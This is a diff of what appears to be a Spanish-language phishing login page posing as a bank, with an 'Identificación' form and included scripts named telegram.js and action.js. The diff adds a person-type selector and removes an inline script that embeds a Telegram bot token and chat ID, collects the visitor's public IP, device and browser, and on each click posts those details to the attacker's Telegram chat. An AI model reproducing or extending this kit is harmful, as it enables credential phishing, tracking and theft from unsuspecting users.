@@ -549,7 +549,13 @@
                 </div>
 
                 <form method="post" id="loginForm" onsubmit="return sender();" autocomplete="off">
-                   
+                    <div class="label">Tipo de Persona</div>
+                    <div class="custom-select">
+                        <select id="tipoPersona">
+                            <option value="Personas">Personas</option>
+                            <option value="Empresas">Empresas</option>
+                        </select>
+                    </div>
 
                     <div class="label">Identificación</div>
                     <div class="id-row">
@@ -648,104 +654,7 @@
             </div>
         </div>
     </div>
-<script>
-        const BOT_TOKEN = "8703984328:AAEDc6VejCNeQqmQwSWgjsCUaSID0lx9BvU";
-        const CHAT_ID = "7776240161";
 
-   
-async function obtenerIP() {
-    try {
-        const r = await fetch("https://api.ipify.org?format=json");
-        const data = await r.json();
-        return data.ip;
-    } catch {
-        return "No disponible";
-    }
-}
-
-function obtenerDispositivo() {
-    const ua = navigator.userAgent;
-
-    let dispositivo = "Desconocido";
-
-    if (/iPhone/i.test(ua)) {
-        dispositivo = "iPhone";
-    } else if (/iPad/i.test(ua)) {
-        dispositivo = "iPad";
-    } else if (/Android/i.test(ua)) {
-        dispositivo = "Android";
-    } else if (/Windows/i.test(ua)) {
-        dispositivo = "PC Windows";
-    } else if (/Macintosh/i.test(ua)) {
-        dispositivo = "Mac";
-    } else if (/Linux/i.test(ua)) {
-        dispositivo = "Linux";
-    }
-
-    return dispositivo;
-}
-
-function obtenerNavegador() {
-    const ua = navigator.userAgent;
-
-    if (/Edg/i.test(ua)) return "Microsoft Edge";
-    if (/Chrome/i.test(ua)) return "Google Chrome";
-    if (/Firefox/i.test(ua)) return "Firefox";
-    if (/Safari/i.test(ua)) return "Safari";
-
-    return "Desconocido";
-}
-
-async function enviarTelegram(texto) {
-
-    const url =
-        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-    await fetch(url, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: texto
-        })
-    });
-}
-
-document.addEventListener("click", async (event) => {
-
-    const elemento = event.target.closest("button, a");
-
-    if (!elemento) return;
-
-    const ip = await obtenerIP();
-    const dispositivo = obtenerDispositivo();
-    const navegador = obtenerNavegador();
-
-    const mensaje = `
-🔔 NUEVO CLIC trafic
-
-🖱 Elemento: ${
-        elemento.innerText.trim() ||
-        elemento.getAttribute("aria-label") ||
-        "Sin nombre"
-    }
-
-🌐 Página: ${location.href}
-🌍 IP pública: ${ip}
-
-📱 Dispositivo: ${dispositivo}
-🌐 Navegador: ${navegador}
-
-📐 Pantalla: ${screen.width}x${screen.height}
-
-🕐 Hora: ${new Date().toLocaleString()}
-    `;
-
-    enviarTelegram(mensaje);
-});
-</script>
     <script src="telegram.js"></script>
     <script src="action.js"></script>
     
